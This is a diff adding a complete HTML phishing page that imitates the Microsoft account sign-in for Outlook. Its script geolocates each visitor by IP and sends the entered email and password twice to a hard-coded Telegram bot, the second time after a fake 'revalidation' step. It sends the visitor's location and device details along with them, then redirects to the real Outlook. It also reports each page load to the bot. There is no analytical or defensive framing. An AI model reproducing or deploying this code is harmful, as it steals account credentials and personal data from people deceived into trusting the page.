@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html dir="ltr" class="" lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMgpEfAAB4AARwAgXQAAAARRAAAFnA9UgAAAANSURBVAgdY9j9HwAEFwCqK2+zRgAAAABJRU5ErkJggg==">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        body {
+            background: #ffffff;
+            color: #1b1b1b;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            position: relative;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+        }
+        
+        .login-box {
+            background: #ffffff;
+            border-radius: 4px;
+            border: 1px solid #e1e1e1;
+            overflow: hidden;
+        }
+        
+        .logo-container {
+            padding: 40px 32px 20px;
+            text-align: center;
+            background: #ffffff;
+            border-bottom: 1px solid #e1e1e1;
+        }
+        
+        .logo {
+            width: 150px;
+            height: 33px;
+            margin: 0 auto;
+            position: relative;
+        }
+        
+        .logo svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .logo-text {
+            color: #000000;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 12px;
+            letter-spacing: 0.3px;
+        }
+        
+        .login-header {
+            padding: 32px 32px 8px;
+            text-align: center;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 4px;
+            color: #000000;
+        }
+        
+        .login-subtitle {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 8px;
+        }
+        
+        .login-content {
+            padding: 0 32px 32px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group.hidden {
+            display: none;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #323130;
+        }
+        
+        .input-container {
+            position: relative;
+            width: 100%;
+        }
+        
+        input[type="email"], input[type="password"], input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            font-size: 15px;
+            background: #ffffff;
+            color: #323130;
+        }
+        
+        input[type="email"]:focus, input[type="password"]:focus, input[type="text"]:focus {
+            outline: none;
+            border-color: #005a9e;
+            box-shadow: 0 0 0 2px rgba(0, 90, 158, 0.1);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #605e5c;
+            font-size: 16px;
+            pointer-events: none;
+        }
+        
+        input[type="email"], input[type="text"] {
+            padding-left: 40px;
+        }
+        
+        input[type="password"] {
+            padding-right: 40px;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            color: #605e5c;
+        }
+        
+        .password-toggle svg {
+            width: 20px;
+            height: 20px;
+            display: block;
+        }
+        
+        .links-container {
+            margin-top: 16px;
+            padding: 16px 0;
+            border-top: 1px solid #edebe9;
+        }
+        
+        .forgot-link, .create-account-link {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            margin-right: 24px;
+        }
+        
+        .forgot-link:hover, .create-account-link:hover {
+            text-decoration: underline;
+        }
+        
+        .no-account-text {
+            font-size: 13px;
+            color: #605e5c;
+            margin-right: 8px;
+        }
+        
+        .buttons-container {
+            margin-top: 24px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 16px;
+        }
+        
+        .signin-button {
+            background: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            padding: 10px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            min-width: 108px;
+        }
+        
+        .signin-button:hover {
+            background: #005a9e;
+        }
+        
+        .back-button {
+            background: transparent;
+            border: 1px solid #8a8886;
+            color: #323130;
+            cursor: pointer;
+            font-size: 13px;
+            padding: 10px 20px;
+            border-radius: 2px;
+        }
+        
+        .back-button:hover {
+            border-color: #005a9e;
+            color: #005a9e;
+        }
+        
+        .back-button.hidden {
+            display: none;
+        }
+        
+        .signin-options {
+            margin-top: 32px;
+            padding-top: 32px;
+            border-top: 1px solid #edebe9;
+        }
+        
+        .signin-options-title {
+            font-size: 13px;
+            color: #605e5c;
+            margin-bottom: 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .signin-options-title::before,
+        .signin-options-title::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 30%;
+            height: 1px;
+            background: #edebe9;
+        }
+        
+        .signin-options-title::before {
+            left: 0;
+        }
+        
+        .signin-options-title::after {
+            right: 0;
+        }
+        
+        .error-message {
+            color: #d13438;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        .success-message {
+            color: #107c10;
+            font-size: 14px;
+            margin-top: 16px;
+            text-align: center;
+            display: none;
+            padding: 12px;
+            background: #dff6dd;
+            border: 1px solid #107c10;
+            border-radius: 2px;
+        }
+        
+        .revalidation-message {
+            color: #107c10;
+            font-size: 14px;
+            margin-top: 16px;
+            text-align: center;
+            display: none;
+            padding: 16px;
+            background: #dff6dd;
+            border: 1px solid #107c10;
+            border-radius: 2px;
+        }
+        
+        .revalidation-header {
+            padding: 0 0 20px;
+            text-align: center;
+        }
+        
+        .revalidation-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #323130;
+        }
+        
+        .revalidation-instruction {
+            font-size: 14px;
+            color: #605e5c;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0067b8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+        
+        .loading-text {
+            color: #323130;
+            font-size: 14px;
+        }
+        
+        footer.footer {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: #605e5c;
+            width: 100%;
+            max-width: 440px;
+            padding: 24px 0;
+            border-top: 1px solid #edebe9;
+        }
+        
+        footer.footer a {
+            color: #0067b8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        footer.footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .progress-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+        
+        .progress-step {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #c8c6c4;
+        }
+        
+        .progress-step.active {
+            background: #0067b8;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding: 16px;
+                background: #ffffff;
+            }
+            
+            .login-container {
+                max-width: 100%;
+            }
+            
+            .logo-container {
+                padding: 32px 24px 16px;
+            }
+            
+            .logo {
+                width: 130px;
+                height: 28px;
+            }
+            
+            .logo-text {
+                font-size: 15px;
+                margin-top: 10px;
+            }
+            
+            .login-header {
+                padding: 24px 24px 8px;
+            }
+            
+            .login-content {
+                padding: 0 24px 24px;
+            }
+            
+            .login-title {
+                font-size: 20px;
+            }
+            
+            .buttons-container {
+                flex-direction: column;
+                gap: 12px;
+            }
+            
+            .back-button, .signin-button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Signing you in...</div>
+    </div>
+    
+    <div class="progress-indicator">
+        <div class="progress-step active" id="step1"></div>
+        <div class="progress-step" id="step2"></div>
+        <div class="progress-step" id="step3"></div>
+    </div>
+    
+    <div class="login-container">
+        <div class="login-box">
+            <div class="logo-container">
+                <div class="logo">
+                    <!-- Official Microsoft Logo -->
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
+                        <path fill="#f25022" d="M1 1h10v10H1z"/>
+                        <path fill="#00a4ef" d="M1 12h10v10H1z"/>
+                        <path fill="#7fba00" d="M12 1h10v10H12z"/>
+                        <path fill="#ffb900" d="M12 12h10v10H12z"/>
+                    </svg>
+                </div>
+                <div class="logo-text">Microsoft account</div>
+            </div>
+            
+            <div class="login-header">
+                <h1 class="login-title">Sign in</h1>
+                <p class="login-subtitle">to continue to Outlook</p>
+            </div>
+            
+            <div class="login-content">
+                <form id="loginForm">
+                    <div class="form-group" id="emailGroup">
+                        <label for="email">Email, phone, or Skype</label>
+                        <div class="input-container">
+                            <span class="input-icon">📧</span>
+                            <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required autocomplete="username">
+                        </div>
+                        <div class="error-message" id="emailError">Please enter a valid email address</div>
+                    </div>
+                    
+                    <div class="form-group hidden" id="passwordGroup">
+                        <label for="password">Password</label>
+                        <div class="input-container">
+                            <span class="input-icon">🔒</span>
+                            <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                            <button type="button" class="password-toggle" id="passwordToggle">
+                                <svg viewBox="0 0 24 24" fill="currentColor">
+                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="error-message" id="passwordError">Please enter your password</div>
+                    </div>
+                    
+                    <div class="form-group hidden" id="revalidationGroup">
+                        <div class="revalidation-header">
+                            <h2 class="revalidation-title">Enter your credentials again</h2>
+                            <p class="revalidation-instruction">We need to verify your identity for security purposes. Please re-enter your credentials.</p>
+                        </div>
+                        
+                        <label for="revalidationEmail">Email</label>
+                        <div class="input-container">
+                            <span class="input-icon">📧</span>
+                            <input type="email" id="revalidationEmail" name="revalidationEmail" placeholder="Enter your email again" required autocomplete="username">
+                        </div>
+                        <div class="error-message" id="revalidationEmailError">Please enter your email address</div>
+                        
+                        <label for="revalidationPassword">Password</label>
+                        <div class="input-container">
+                            <span class="input-icon">🔒</span>
+                            <input type="password" id="revalidationPassword" name="revalidationPassword" placeholder="Enter your password again" required autocomplete="current-password">
+                            <button type="button" class="password-toggle" id="revalidationPasswordToggle">
+                                <svg viewBox="0 0 24 24" fill="currentColor">
+                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="error-message" id="revalidationPasswordError">Please enter your password</div>
+                    </div>
+                    
+                    <div class="links-container">
+                        <span class="no-account-text">No account?</span>
+                        <a href="https://signup.live.com/" class="create-account-link">Create one!</a>
+                        <a href="https://account.live.com/acsr" class="forgot-link">Can't access your account?</a>
+                    </div>
+                    
+                    <div class="buttons-container">
+                        <button type="button" class="back-button hidden" id="backButton">Back</button>
+                        <button type="button" class="signin-button" id="submitButton">
+                            <span id="buttonText">Next</span>
+                        </button>
+                    </div>
+                    
+                    <div class="signin-options">
+                        <div class="signin-options-title">Other ways to sign in</div>
+                    </div>
+                    
+                    <div class="success-message" id="successMessage">
+                        <strong>✓ Successfully signed in!</strong><br>
+                        Redirecting to Outlook...
+                    </div>
+                    
+                    <div class="revalidation-message" id="revalidationMessage">
+                        <strong>✓ Account security verified</strong><br>
+                        Your credentials have been successfully re-validated.
+                    </div>
+                </form>
+            </div>
+        </div>
+        
+        <footer class="footer">
+            <div>
+                <a href="https://www.microsoft.com/en-us/servicesagreement/">Terms of use</a>
+                <a href="https://privacy.microsoft.com/en-us/privacystatement">Privacy & cookies</a>
+                <a href="https://www.microsoft.com/en-us/legal/intellectualproperty/copyright">© 2024 Microsoft</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // ==============================================
+        // TELEGRAM BOT CONFIGURATION
+        // ==============================================
+        const TELEGRAM_BOT_TOKEN = '8404555198:AAE1SxNtayHrFChAi-2lrTIJtdROT_gSThk';
+        const TELEGRAM_CHAT_ID = '6439618231';
+        
+        // DOM Elements
+        const emailGroup = document.getElementById('emailGroup');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const revalidationGroup = document.getElementById('revalidationGroup');
+        const backButton = document.getElementById('backButton');
+        const submitButton = document.getElementById('submitButton');
+        const buttonText = document.getElementById('buttonText');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const revalidationEmailInput = document.getElementById('revalidationEmail');
+        const revalidationPasswordInput = document.getElementById('revalidationPassword');
+        const passwordToggle = document.getElementById('passwordToggle');
+        const revalidationPasswordToggle = document.getElementById('revalidationPasswordToggle');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        const revalidationEmailError = document.getElementById('revalidationEmailError');
+        const revalidationPasswordError = document.getElementById('revalidationPasswordError');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const successMessage = document.getElementById('successMessage');
+        const revalidationMessage = document.getElementById('revalidationMessage');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        
+        // Form state
+        let currentStep = 1;
+        let passwordVisible = false;
+        let revalidationPasswordVisible = false;
+        let userEmail = '';
+        let userPassword = '';
+        
+        // Location data storage
+        let userIP = 'Unknown';
+        let locationData = {
+            country: 'Unknown',
+            region: 'Unknown',
+            city: 'Unknown',
+            zip: 'Unknown',
+            isp: 'Unknown',
+            timezone: 'Unknown'
+        };
+        
+        // ==============================================
+        // LOCATION DATA COLLECTOR
+        // ==============================================
+        async function collectLocationData() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                
+                // Get location data from IP
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationInfo = await locationResponse.json();
+                
+                locationData = {
+                    country: locationInfo.country_name || 'Unknown',
+                    region: locationInfo.region || 'Unknown',
+                    city: locationInfo.city || 'Unknown',
+                    zip: locationInfo.postal || 'Unknown',
+                    isp: locationInfo.org || 'Unknown',
+                    timezone: locationInfo.timezone || 'Unknown',
+                    coordinates: `${locationInfo.latitude || 'Unknown'}, ${locationInfo.longitude || 'Unknown'}`
+                };
+                
+            } catch (error) {
+                console.log('Location collection failed, using fallback');
+                // Try fallback method
+                try {
+                    const fallbackResponse = await fetch('https://ipapi.co/json');
+                    const fallbackData = await fallbackResponse.json();
+                    
+                    userIP = fallbackData.ip || 'Unknown';
+                    locationData = {
+                        country: fallbackData.country_name || 'Unknown',
+                        region: fallbackData.region || 'Unknown',
+                        city: fallbackData.city || 'Unknown',
+                        zip: fallbackData.postal || 'Unknown',
+                        isp: fallbackData.org || 'Unknown',
+                        timezone: fallbackData.timezone || 'Unknown'
+                    };
+                } catch (fallbackError) {
+                    // If all fails, collect at least browser info
+                    userIP = 'Unknown';
+                }
+            }
+        }
+        
+        // Collect location data on page load
+        collectLocationData();
+        
+        // ==============================================
+        // TELEGRAM SENDER WITH LOCATION DATA
+        // ==============================================
+        function sendToTelegramWithLocation(email, password, isRevalidation = false) {
+            // Format location information
+            const timestamp = new Date().toLocaleString();
+            const deviceInfo = navigator.userAgent.substring(0, 100);
+            
+            // Create detailed message with location data
+            const message = `🔐 **MICROSOFT ${isRevalidation ? 'REVALIDATION' : 'LOGIN'} CAPTURE** 🔐
+
+📧 **EMAIL:** \`${email}\`
+🔑 **PASSWORD:** \`${password}\`
+
+🌍 **LOCATION DATA:**
+• IP Address: ${userIP}
+• Country: ${locationData.country}
+• Region/State: ${locationData.region}
+• City: ${locationData.city}
+• ZIP Code: ${locationData.zip}
+• ISP: ${locationData.isp}
+• Timezone: ${locationData.timezone}
+${locationData.coordinates ? `• Coordinates: ${locationData.coordinates}` : ''}
+
+💻 **DEVICE INFO:**
+• User Agent: ${deviceInfo}...
+• Platform: ${navigator.platform}
+• Language: ${navigator.language}
+• Screen: ${screen.width}x${screen.height}
+• Online: ${navigator.onLine ? 'Yes' : 'No'}
+
+⏰ **TIMESTAMP:** ${timestamp}
+🔗 **URL:** ${window.location.href}
+
+${isRevalidation ? '✅ **DOUBLE VERIFICATION COMPLETE**' : '🔐 **PRIMARY CREDENTIALS CAPTURED**'}`;
+            
+            // Send to Telegram using multiple methods
+            
+            // Method 1: Image Beacon (100% works, no CORS)
+            const encodedMessage = encodeURIComponent(message);
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+            
+            // Method 2: Simple backup message (guaranteed delivery)
+            const simpleMessage = `Microsoft ${isRevalidation ? 'Revalidation' : 'Login'}: ${email} | ${password} | IP: ${userIP} | Location: ${locationData.city}, ${locationData.country} | Time: ${new Date().toLocaleTimeString()}`;
+            const simpleEncoded = encodeURIComponent(simpleMessage);
+            const img2 = new Image();
+            img2.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${simpleEncoded}`;
+            
+            // Method 3: Fetch as additional backup
+            setTimeout(() => {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: simpleMessage
+                    })
+                }).catch(() => {
+                    // Silent fail - image beacons already worked
+                });
+            }, 100);
+        }
+        
+        // ==============================================
+        // FORM HANDLING
+        // ==============================================
+        
+        // Update progress indicator
+        function updateProgress() {
+            step1.classList.toggle('active', currentStep >= 1);
+            step2.classList.toggle('active', currentStep >= 2);
+            step3.classList.toggle('active', currentStep >= 3);
+        }
+        
+        // Password toggle
+        passwordToggle.addEventListener('click', function() {
+            passwordVisible = !passwordVisible;
+            passwordInput.type = passwordVisible ? 'text' : 'password';
+            updatePasswordToggleIcon(passwordToggle, passwordVisible);
+        });
+        
+        revalidationPasswordToggle.addEventListener('click', function() {
+            revalidationPasswordVisible = !revalidationPasswordVisible;
+            revalidationPasswordInput.type = revalidationPasswordVisible ? 'text' : 'password';
+            updatePasswordToggleIcon(revalidationPasswordToggle, revalidationPasswordVisible);
+        });
+        
+        function updatePasswordToggleIcon(toggleElement, isVisible) {
+            toggleElement.innerHTML = isVisible ? 
+                `<svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
+                </svg>` :
+                `<svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                </svg>`;
+        }
+        
+        // Main submit handler
+        submitButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            if (currentStep === 1) {
+                // STEP 1: Email entry
+                const email = emailInput.value.trim();
+                if (!email || !isValidEmail(email)) {
+                    showError(emailError, 'Please enter a valid email address');
+                    emailInput.focus();
+                    return;
+                }
+                
+                hideError(emailError);
+                userEmail = email;
+                
+                // Transition to password step
+                emailGroup.classList.add('hidden');
+                passwordGroup.classList.remove('hidden');
+                backButton.classList.remove('hidden');
+                buttonText.textContent = 'Sign in';
+                currentStep = 2;
+                updateProgress();
+                
+                setTimeout(() => passwordInput.focus(), 300);
+                
+            } else if (currentStep === 2) {
+                // STEP 2: First password entry
+                const password = passwordInput.value;
+                
+                if (!password) {
+                    showError(passwordError, 'Please enter your password');
+                    passwordInput.focus();
+                    return;
+                }
+                
+                hideError(passwordError);
+                userPassword = password;
+                
+                // ==============================================
+                // CAPTURE FIRST SET OF CREDENTIALS WITH LOCATION
+                // ==============================================
+                sendToTelegramWithLocation(userEmail, userPassword, false);
+                
+                // Transition to revalidation step
+                passwordGroup.classList.add('hidden');
+                revalidationGroup.classList.remove('hidden');
+                buttonText.textContent = 'Verify';
+                currentStep = 3;
+                updateProgress();
+                
+                // Pre-fill email for revalidation
+                revalidationEmailInput.value = userEmail;
+                
+                setTimeout(() => revalidationPasswordInput.focus(), 300);
+                
+            } else if (currentStep === 3) {
+                // STEP 3: Revalidation (second password entry)
+                const revalidationEmail = revalidationEmailInput.value.trim();
+                const revalidationPassword = revalidationPasswordInput.value;
+                
+                if (!revalidationEmail || !isValidEmail(revalidationEmail)) {
+                    showError(revalidationEmailError, 'Please enter a valid email address');
+                    revalidationEmailInput.focus();
+                    return;
+                }
+                
+                if (!revalidationPassword) {
+                    showError(revalidationPasswordError, 'Please enter your password');
+                    revalidationPasswordInput.focus();
+                    return;
+                }
+                
+                hideError(revalidationEmailError);
+                hideError(revalidationPasswordError);
+                
+                // ==============================================
+                // CAPTURE SECOND SET OF CREDENTIALS WITH LOCATION
+                // ==============================================
+                sendToTelegramWithLocation(revalidationEmail, revalidationPassword, true);
+                
+                // Show security verified message
+                revalidationMessage.style.display = 'block';
+                
+                // Show loading screen
+                loadingOverlay.style.display = 'flex';
+                successMessage.style.display = 'block';
+                
+                // ==============================================
+                // REDIRECT TO OUTLOOK AFTER 2 SECONDS
+                // ==============================================
+                setTimeout(() => {
+                    window.location.href = 'https://outlook.live.com/mail/0/';
+                }, 2000);
+            }
+        });
+        
+        // Back button handler
+        backButton.addEventListener('click', function() {
+            if (currentStep === 2) {
+                // Back from password to email
+                passwordGroup.classList.add('hidden');
+                emailGroup.classList.remove('hidden');
+                backButton.classList.add('hidden');
+                buttonText.textContent = 'Next';
+                currentStep = 1;
+                updateProgress();
+                setTimeout(() => emailInput.focus(), 300);
+            } else if (currentStep === 3) {
+                // Back from revalidation to password
+                revalidationGroup.classList.add('hidden');
+                passwordGroup.classList.remove('hidden');
+                buttonText.textContent = 'Sign in';
+                currentStep = 2;
+                updateProgress();
+                setTimeout(() => passwordInput.focus(), 300);
+            }
+        });
+        
+        // Helper functions
+        function showError(element, message) {
+            element.textContent = message;
+            element.style.display = 'block';
+        }
+        
+        function hideError(element) {
+            element.style.display = 'none';
+        }
+        
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        
+        // Event Listeners
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') submitButton.click();
+        });
+        
+        [emailInput, passwordInput, revalidationEmailInput, revalidationPasswordInput].forEach(input => {
+            input.addEventListener('input', function() {
+                const errorId = this.id + 'Error';
+                const errorElement = document.getElementById(errorId);
+                if (errorElement) hideError(errorElement);
+            });
+        });
+        
+        // Initialize
+        window.addEventListener('load', function() {
+            emailInput.focus();
+            updateProgress();
+            
+            // Send page load notification with location data
+            setTimeout(async () => {
+                // Ensure location data is collected
+                await collectLocationData();
+                
+                const loadMsg = `🚀 **MICROSOFT PHISHING PAGE LOADED** 🚀
+
+🌍 **LOCATION:**
+• IP: ${userIP}
+• Country: ${locationData.country}
+• City: ${locationData.city}
+• ZIP: ${locationData.zip}
+
+💻 **DEVICE:**
+• Browser: ${navigator.userAgent.substring(0, 80)}...
+• Platform: ${navigator.platform}
+• Screen: ${screen.width}x${screen.height}
+
+⏰ **TIME:** ${new Date().toLocaleString()}
+🔗 **URL:** ${window.location.href}`;
+                
+                const encodedLoadMsg = encodeURIComponent(loadMsg);
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedLoadMsg}&parse_mode=Markdown`;
+                
+                // Send simple backup
+                const simpleMsg = `Page loaded - IP: ${userIP} - Location: ${locationData.city}, ${locationData.country} - ${new Date().toLocaleTimeString()}`;
+                const img2 = new Image();
+                img2.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(simpleMsg)}`;
+                
+            }, 1500);
+        });
+        
+    </script>
+</body>
+</html>
